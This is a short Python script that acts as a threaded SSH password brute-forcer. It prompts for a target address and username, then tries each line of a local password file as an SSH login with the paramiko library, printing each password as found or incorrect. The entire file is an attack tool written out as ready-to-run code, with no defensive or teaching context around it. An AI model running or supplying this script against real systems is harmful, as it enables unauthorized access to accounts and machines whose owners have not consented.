import paramiko
import sys
import os
import socket
import termcolor,threading, time

stop_flag = 0


def ssh_connect(passwd):
    global stop_flag

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=passwd)
        stop_flag = 1
        print(termcolor.colored(('[+] Found password ' + passwd + ' for account ' + username), 'green'))
    except:
        print(termcolor.colored(('[-]Incorrect Login ' + passwd), 'red'))
    ssh.close()


host = input('Enter target address: ')
username = input('Enter SSH username: ')
print('\n')

password_file  = 'passfile.txt'

if not os.path.exists(password_file):
    print('File/PAth doesnt exist')
    sys.exit(1)

print('Starting Threaded SSH BruteForce On '  + host +  ' With  Account: ' + username + ' * * *')


with open(password_file,'r') as file:
    for line in file.readlines():
        if stop_flag == 1:
            t.join()
            exit()

        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        time.sleep(0.5)

#execution_time = timeit.timeit()

